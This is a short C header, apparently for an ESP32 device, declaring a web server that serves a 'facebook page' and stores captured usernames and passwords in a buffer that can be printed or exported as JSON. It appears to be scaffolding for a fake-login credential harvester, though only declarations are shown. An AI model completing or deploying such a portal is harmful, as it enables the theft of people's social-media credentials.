#ifndef FACEBOOK_WEB_SERVER_H
#define FACEBOOK_WEB_SERVER_H

#include "allocator.h"
#include "socket.h"
#include "http_request.h"
#include "http_response.h"
#include "esp_log.h"
#include "html_pages.h"
// Structură pentru a păstra o singură intrare de credențiale
typedef struct {
    char username[128];
    char password[128];
} cred_entry_t;

#define MAX_CRED_ENTRIES 10
typedef struct {
    cred_entry_t entries[MAX_CRED_ENTRIES];
    int count;
} cred_buffer_t;

cred_buffer_t cred_buffer = {0};
#define MAX_CRED_ENDTRIES_JSON (sizeof(cred_buffer) + 64)

static void store_credentials(cred_buffer_t* buffer, const char* user, const char* pass) ;
void print_cred_buffer(cred_buffer_t* buffer);
int cred_buffer_to_json(cred_buffer_t* buffer, char* out, size_t out_size);
void handle_facebook_connection(allocator_t* allocator, http_request_t* req, int client_sock);
void serve_facebook_page();


#endif // FACEBOOK_WEB_SERVER_H